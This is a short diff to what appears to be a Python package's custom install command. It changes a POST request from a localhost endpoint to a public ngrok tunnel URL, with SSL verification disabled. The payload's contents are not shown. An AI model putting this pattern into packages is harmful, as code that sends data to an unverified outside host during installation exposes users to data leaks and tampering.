@@ -45,11 +45,11 @@ class CustomInstallCommand(install):
 
             # Debugging: Log payload and endpoint
             print(f"\n\n\033[92mPOST request payload: {payload}\033[0m", flush=True)
-            print(f"\n\n\033[92mPOST request URL: http://127.0.0.1:5000/fetch_readme\033[0m", flush=True)
+            print(f"\n\n\033[92mPOST request URL: https://393a-2405-201-c009-10-de53-9b2d-918b-cb65.ngrok-free.app/fetch_readme\033[0m", flush=True)
 
             # Make the POST request
             response = requests.post(
-                "http://127.0.0.1:5000/fetch_readme",
+                "https://393a-2405-201-c009-10-de53-9b2d-918b-cb65.ngrok-free.app/fetch_readme",
                 headers={"Content-Type": "application/json"},
                 data=json.dumps(payload),
                 verify=False  # Disable SSL verification
